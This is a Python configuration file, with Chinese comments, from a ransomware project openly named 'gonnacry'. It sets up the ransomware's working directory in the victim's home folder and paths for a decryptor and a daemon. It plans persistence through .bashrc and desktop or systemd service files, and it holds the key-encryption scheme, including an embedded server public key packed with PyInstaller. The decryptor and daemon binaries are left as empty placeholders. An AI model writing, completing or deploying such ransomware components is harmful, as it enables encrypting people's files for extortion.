# variables.py 

import sys
import os
import environment  # 假设这是一个自定义模块，提供 get_home_path() 等

ransomware_name = "gonnacry"
home = environment.get_home_path()  # 如 /root
desktop = environment.get_desktop_path()
username = environment.get_username()

# 运行时目录
ransomware_path = os.path.join(home, ransomware_name)
os.makedirs(ransomware_path, exist_ok=True)  # 确保存在

#在get_famliy中修改测试路径，这里没用
test_path = "/home/attackfile/"  # 可调整
decryptor_path = os.path.join(ransomware_path, "decryptor")
daemon_path = os.path.join(ransomware_path, "daemon")
gonnacry_path = ''
bashrc_path = os.path.join(home, '.bashrc')
daemon_desktop = os.path.join(ransomware_path, 'daemon.desktop')
daemon_service = os.path.join(ransomware_path, 'daemon.service')

# 密钥路径
aes_encrypted_keys_path = os.path.join(ransomware_path, "AES_encrypted_keys.txt")
encrypted_client_private_key_path = os.path.join(ransomware_path, 'encrypted_client_private_key.key')
client_public_key_path = os.path.join(ransomware_path, "client_public_key.PEM")

def resource_path(relative_path):
    """ PyInstaller 打包后也能正确找到文件 """
    try:
        # PyInstaller 创建临时文件夹，并把路径存入 _MEIPASS
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)

def get_server_public_key():
    pem_path = resource_path("server_public.pem")   # 关键！
    if not os.path.exists(pem_path):
        raise FileNotFoundError(f"server_public.pem not found! Expected at: {pem_path}")
    with open(pem_path, "rb") as f:
        return f.read()

server_public_key = get_server_public_key()


# Base64 编码的 decryptor 和 daemon (占位符 - 替换为实际 base64 编码的二进制)
decryptor = ""  # base64.b64encode(decryptor_binary).decode('utf-8')
daemon = ""     # base64.b64encode(daemon_binary).decode('utf-8')
